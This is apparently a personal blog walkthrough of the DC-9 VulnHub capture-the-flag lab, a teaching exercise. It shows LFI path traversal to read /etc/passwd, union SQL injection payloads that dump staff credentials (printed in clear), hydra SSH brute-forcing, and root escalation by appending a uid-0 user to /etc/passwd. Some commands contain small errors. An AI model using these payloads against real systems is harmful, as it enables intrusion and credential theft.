---
title: "DC-9"
date: 2022-03-29T17:46:31+08:00
draft: false
---

DC-9 is another purposely built vulnerable lab to gain experience in the world of penetration testing. The ultimate goal of this challenge is to get root and to read the only flag. DC-9 is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click [here](https://www.vulnhub.com/entry/dc-9,412/).

Thanks to [@DCAU7](https://twitter.com/DCAU7) and the team for creating this machine.

> The machine IP address is `192.168.50.108` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine

## Scanning
Let us start by scanning using Nmap to find any opened ports in the machine.

``` 
nmap -sC -sV -oN initial.scan 192.168.50.108
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 01:40 EDT
Nmap scan report for 192.168.50.108
Host is up (0.0036s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
```

Port 80 is open, which is running an HTTP service. The website allows us to display the staff records, search staff records by either using their first or last name or managing them. But managing it requires a login credential.

## Enumeration

Looking at the site, we see that it's running a .php extension. With this info, I can fuzz for a directory/page that has a .php file extension.

Running a tool called `ffuf` with options/flags, we manage to find a few more files.

- w: location of the wordlist
- u: the URL that we want to scan for files/directories
- e: include the extension we specify
- fc: filter HTTP status code from the response

``` 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://192.168.50.108/FUZZ -e .php -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.108/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
search.php              [Status: 200, Size: 1091, Words: 47, Lines: 50]
results.php             [Status: 200, Size: 1056, Words: 43, Lines: 55]
index.php               [Status: 200, Size: 917, Words: 43, Lines: 43]
manage.php              [Status: 200, Size: 1210, Words: 43, Lines: 51]
welcome.php             [Status: 302, Size: 0, Words: 1, Lines: 1]
display.php             [Status: 200, Size: 2961, Words: 199, Lines: 42]
.                       [Status: 200, Size: 917, Words: 43, Lines: 43]
session.php             [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [34258/34258] :: Job [1/1] :: 537 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Navigating to the config.php will end up in a blank page. Navigating to either the welcome.php or session.php will somehow log us in. Two new tabs are introduced to us, Add Record and Log Out but, clicking on those will not bring us anywhere. Looking at the developer tools > storage, we obtained a session cookie. I do see a warning message saying "File does not exist". It could mean that we can do a Local File Inclusion (LFI).

An example of a vulnerable PHP code that could lead to LFI is:

`example.com/?page=filename.php`

For our issue, we do not know the actual name/value that carries our "page". I'm going to fuzz for the value and do a Directory (Path) Traversal.

- -b: Cookie data "Name1=Value1"
- -fs: Filter HTTP response size

> Doing this without the session cookie will not work. We take the session cookie from the developer tool. Do filter the size if not, you will missed it.

``` 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.50.108/manage.php?FUZZ=../../../../../../../../etc/passwd -b "PHPSESSID=622uuknu5m2krs25evhm9uo7qc" -fs 1341 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.108/manage.php?FUZZ=../../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Header           : Cookie: PHPSESSID=622uuknu5m2krs25evhm9uo7qc
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1341
________________________________________________

file                    [Status: 200, Size: 3748, Words: 85, Lines: 95]
:: Progress: [63087/63087] :: Job [1/1] :: 1309 req/sec :: Duration: [0:01:09] :: Errors: 0 ::
```

It worked! I copy the result to my terminal to have a better look at it. I save the file as etc.passwd. After sorting it out, I see `MySQL` and plenty of user accounts. I then create a file called `username` and save the content there. 

```
cat etc.passwd | tr " " "\n" | grep bash | tr ":/" " " | awk '{print $3}' | grep -v 0 > username
```

Earlier, we see MySQL in the /etc/passwd. We do know that we can search for staff details. After testing it some trial and error in Burp > Repeater, the search bar is vulnerable to Union SQLi. Using the payload UNION SELECT 1,2,3,4,5,6 will return us a valid output. Anything more or less than 6 will not return us anything.

{{<image src="/DC-9/union_sqli.png" position="center" style="border-radius: 8px;">}}

Moving forward, we can get all the important information we need.

- MySQL Version
- Database
- Table
- Columns
- Data (Username & Password)

SQL injection UNION attacks that I used for this machine: 

| Payload | Description |
|---------|-------------|
| Mary' UNION SELECT 1,2,3,4,5,6-\- -| Determine the number of columns |
| Mary' UNION SELECT schema_name,@@version,3,4,5,6 FROM information_schema.schemata-\- -| Get Database and SQL Version |
| Mary' UNION SELECT table_schema,table_name,3,4,5,6 FROM information_schema.columns WHERE table_schema != 'information_schema'-\- -| Get Table name |
| Mary' UNION SELECT table_schema,table_name,3,4,5,6 FROM information_schema.columns WHERE table_schema != 'information_schema'-\- -| Get Columns name |
| Mary' UNION SELECT group_concat(Username,":",Password)2,3,4,5,6 FROM Staff.Users-\- -| Get Username and Password from Staff.Users |
| Mary' UNION SELECT group_concat(username,":",password)2,3,4,5,6 FROM users.UserDetails-\- -| Get Username and Password from Users.UserDetails |

Since i have a list of username from the LFI, i will only take the password and store it into a text file called `password`

```
echo -n 'marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0' | tr "," "\n" | tr ":" " " | awk '{print $2}' > password
```

## Initial Foothold

> Before we begin, I want to say that i totally overlook the SSH port. After i've done with the initial scan, i run another scan which include scanning all the ports `-p-`. The scan did not finish when i was doing the machine. I was stuck for quite some time before i decided to do another quick scan using the `-sS` flag. That is where i see Port 22 SSH is open. Will explain it more below.


Since I have both the usernames and passwords from LFI and SQLi during enumeration, we can attempt to brute-force the SSH using hydra. With the current usernames and passwords, only 3 accounts can successfully log in via SSH.

```
hydra -L username -P password 192.168.50.108 ssh
```

- chandlerb:UrAG0D!
- joeyt:Passw0rd
- janitor:Ilovepeepee 

## Privileged Escalation
#### Janitor to Fredf
Out of the 3 accounts that we SSH in, only Janitor has a hidden directory called `secrets-for-putin`. Inside the directory has 1 file called `passwords-found-on-post-it-notes.txt` that contains a few password.

Copy the new found password and put it inside our current password file and run hydra again. We managed to get a hit with 1 user that is using the newly found password: 

- fredf:B4-Tru3-001

We can either SSH in or just use the su command to change from janitor to fredf. Up to you. 

#### Fredf to Root
Fredf has the sudo rights to run `(root) NOPASSWD: /opt/devstuff/dist/test/test` as root. This can be simply check using `sudo -l`.

Executing this file/binary shows us that it needs 2 parameters: Read and Append. We see that `test` is actually `test.py` when we execute it. We can read the source code for this file/binary which can be found in /opt/devstuff/ directory.

After playing with the binary for a few time, i realise that `test` will append anything that you specify in the first file, into the second file. Since we have sudo permission, we can append a root files too. With this, i will inject a new user into the `/etc/passwd/`. I'm going to do this with openssl to encrypt the my clear text password. 

```
openssl -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0 <-- This is the encrypted password 
```

- -1 : This is specifying which hashing algorithm to use. For this we use MD5. 
- -salt : strings to use as salt. I used the string salt.
- password : Basically this is a clear text password before any encryption. 

Realise that we are still missing a few stuff. Looking at /etc/passwd again, we see something like this: 
`root:x:0:0:/root:/bin/bash`

- x : This is usually the password, but we couldn't see it because its usually inside the shadow file. 

Open up a text editor and fill up the gaps. Our final payload will be like this: 

`fspxnky:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:/root:/bin/bash`

Save the payload and run the binary again as root. 

```
sudo ./test /tmp/hehe.txt /etc/passwd
```

Once done, switch to the newly user that we created: 

```
fredf@dc-9:/opt/devstuff/dist/test$ su fspxnky
Password:
fspxnky@dc-9:/opt/devstuff/dist/test$ ls /root
theflag.txt
fspxnky@dc-9:/opt/devstuff/dist/test# cat /root/theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```

Sadly, this is the last DC machine that will be created from the creators. 

## Investigating Port 22

I was puzzled on how i manage to get SSH Port to open, when my initial scan did not reflect the SSH Port. I asked a few friends and they told me it could be port knocking. Reading this [article](https://www.tecmint.com/port-knocking-to-secure-ssh/) show me how to install and apply port knocking. By default, `knockd.conf` file resides in the `/etc` folder. With root access, i can view and read the contents of the file. To open the SSH port, the sequence are: 7469,8475,9842. To close it, it will be in the reverse order. 

With this, i knew that while i was doing the full scan, it open the port because the sequence are in ascending order. 

## Summary 
I spend alot of time in SQLi because i do not want to use `sqlmap`. Figuring it out manually is very hard but the satisfaction after you got it right, is no doubt the best feeling. Port knocking is something new to me and this is the first time that i came across with it machine. Overall, it was a good machine for me and i learn alot. Till next time. 